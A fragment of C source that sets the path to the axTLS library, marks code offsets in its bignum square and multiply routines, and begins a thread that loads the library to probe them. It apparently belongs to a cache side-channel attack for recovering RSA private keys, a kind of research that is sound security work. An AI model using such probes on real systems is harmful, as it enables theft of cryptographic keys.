...
#define LIBCRYPTO_PATH "/usr/local/lib/libaxtls.so.1.2"
#define LIBCRYPTO_SQUARE_FUNCTION "bi_square"
#define LIBCRYPTO_SQUARE_OFFSET (0x00000000000064E0 - 0x000000000000678C) + 0xF7
#define LIBCRYPTO_MULTIPLY_FUNCTION "bi_multiply"
#define LIBCRYPTO_MULTIPLY_OFFSET (0x00000000000062C8 - 0x00000000000064AB) + 0xB3
#define LIBCRYPTO_BARRETT_FUNCTION "bi_subtract"
#define LIBCRYPTO_BARRETT_OFFSET 0x5E
...
void *probe_thread(void *arg) {
	char *dl_error;
	void *library = dlopen(LIBCRYPTO_PATH, RTLD_NOW);
	if (!library) {
